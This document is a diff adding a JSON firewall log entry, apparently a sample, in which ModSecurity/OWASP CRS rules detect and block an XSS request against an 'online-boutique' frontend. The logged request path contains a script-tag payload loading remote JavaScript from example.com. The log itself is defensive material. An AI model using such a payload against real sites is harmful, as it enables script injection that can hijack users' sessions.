@@ -1,0 +1,54 @@
+{
+  "@timestamp": "2023-08-04T18:57:19.161573764Z",
+  "destination": {
+    "hostname": "frontend.online-boutique",
+    "ip": "192.168.113.159",
+    "port_num": 8080
+  },
+  "level": "",
+  "method": "GET",
+  "msg": "[blocked] 4 WAF rule(s) got hit",
+  "path": "/test/artists.php?q=beer<script%20src=\"example.com/tricky.js\"></script>",
+  "protocol": "HTTP/1.1",
+  "request_id": "e9783ac0-f238-438d-92c4-c01f729c6846",
+  "rules": [
+    {
+      "id": "941100",
+      "message": "XSS Attack Detected via libinjection",
+      "severity": "2",
+      "file": "/etc/modsecurity-ruleset/REQUEST-941-APPLICATION-ATTACK-XSS.conf",
+      "line": "38",
+      "disruptive": false
+    },
+    {
+      "id": "941110",
+      "message": "XSS Filter - Category 1: Script Tag Vector",
+      "severity": "2",
+      "file": "/etc/modsecurity-ruleset/REQUEST-941-APPLICATION-ATTACK-XSS.conf",
+      "line": "64",
+      "disruptive": false
+    },
+    {
+      "id": "941160",
+      "message": "NoScript XSS InjectionChecker: HTML Injection",
+      "severity": "2",
+      "file": "/etc/modsecurity-ruleset/REQUEST-941-APPLICATION-ATTACK-XSS.conf",
+      "line": "181",
+      "disruptive": false
+    },
+    {
+      "id": "949110",
+      "message": "Inbound Anomaly Score Exceeded (Total Score: 15)",
+      "severity": "2",
+      "file": "/etc/modsecurity-ruleset/REQUEST-949-BLOCKING-EVALUATION.conf",
+      "line": "81",
+      "disruptive": true
+    }
+  ],
+  "source": {
+    "hostname": "-",
+    "ip": "192.168.72.213",
+    "port_num": 39454
+  },
+  "host": "pasan-bz-s8y4-kadm-ms"
+}
